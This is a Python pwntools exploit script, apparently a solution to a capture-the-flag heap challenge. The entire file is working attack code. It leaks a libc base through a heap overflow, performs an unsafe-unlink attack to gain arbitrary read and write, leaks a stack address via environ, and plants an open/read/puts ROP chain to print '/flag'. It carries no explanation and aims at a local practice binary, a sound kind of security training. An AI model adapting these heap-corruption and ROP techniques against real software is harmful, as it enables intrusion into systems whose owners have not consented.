#-*-coding:utf-8-*-
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./pwn')
libc = ELF('libc.so.6')

p.sendafter('name? ', 'A'*0x100)

def Add(size, content):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('______?\n', str(size))
    p.sendlineafter('yes_or_no?\n', content)

def Free(index):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('index ?\n', str(index))

def Show(index):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('index ?\n', str(index))

def Edit(index, content):
    p.sendlineafter('>> ', '4')
    p.sendlineafter('index ?\n', str(index))
    p.sendafter('content ?\n', content)

Add(16, 'A'*0x200) #chunk0
Add(0x90, 'A'*0x200) #chunk1
Add(0x80, 'A'*0x200) #chunk2
Add(16, 'A'*0x10) #chunk3
Free(1)
payload = 'A'*0x20
Edit(0, payload)
Show(0)
p.recvuntil('A'*0x20)
libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3c4b78
info("libc_base ==> " + hex(libc_base))

open_addr = libc_base + libc.symbols['open']
info("open_addr ==> " + hex(open_addr))
read_addr = libc_base + libc.symbols['read']
info("read_addr ==> " + hex(read_addr))
puts_addr = libc_base + libc.symbols['puts']
info("puts_addr ==> " + hex(puts_addr))

#修复chunk1
payload = '\x00'*0x18 + p64(0xa1)
Edit(0, payload)

#unlink
Add(0x90, 'A'*0x200) #chunk1
payload = p64(0) + p64(0x91) + p64(0x6032e0+0x8-0x18) + p64(0x6032e0+0x8-0x10) + '\x00'*0x70 + p64(0x90) + p64(0x90)
Edit(1, payload)
Free(2)

environ = libc_base + libc.symbols['environ']
info("environ ==> " + hex(environ))

payload = '\x00'*0x10 + p64(environ)
Edit(1, payload)

Show(0)
stack_addr = u64(p.recv(6).ljust(8, '\x00')) - 0x220
info("stack_addr ==> " + hex(stack_addr))

payload = '/flag' + '\x00'*11 + p64(stack_addr)
Edit(1, payload)

pop_rsi_ret = libc_base + 0x202e8
pop_rdx_ret = libc_base + 0x1b92
pop_rdi_ret = 0x00000000004023b3

payload  = p64(pop_rdi_ret) + p64(0x6032d0) + p64(pop_rsi_ret) + p64(0) + p64(open_addr) #open
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x6032c0) + p64(pop_rdx_ret) + p64(20) + p64(read_addr) #read
payload += p64(pop_rdi_ret) + p64(0x6032c0) + p64(puts_addr) #puts
Edit(0, payload)

p.interactive()

